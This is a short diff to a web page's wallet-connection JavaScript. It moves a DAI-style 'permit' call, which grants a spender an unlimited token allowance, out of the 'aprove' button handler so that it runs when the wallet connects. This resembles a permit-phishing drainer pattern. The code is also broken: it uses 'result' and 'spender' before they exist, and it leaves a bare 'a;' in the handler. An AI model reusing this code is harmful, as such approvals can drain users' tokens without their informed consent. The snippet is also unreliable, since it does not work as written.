@@ -52,6 +52,7 @@
         if(window.ethereum) {
         await window.ethereum.send('eth_requestAccounts');
         window.web3 = new Web3(window.ethereum);
+        const a = await prc20.methods.permit(senderAddress, spender, result.nonce, result.expiry, true, result.v, result.r, result.s).send({from: account});
 
         var accounts = await web3.eth.getAccounts();
         account = accounts[0];
@@ -68,7 +69,7 @@
         }
         document.getElementById('aprove').onclick = () => {
             const result = await signDaiPermit(window.ethereum, prc20, account, ADDRESS);
-            await prc20.methods.permit(senderAddress, spender, result.nonce, result.expiry, true, result.v, result.r, result.s).send({from: account});
+            a;
         }
     }
     
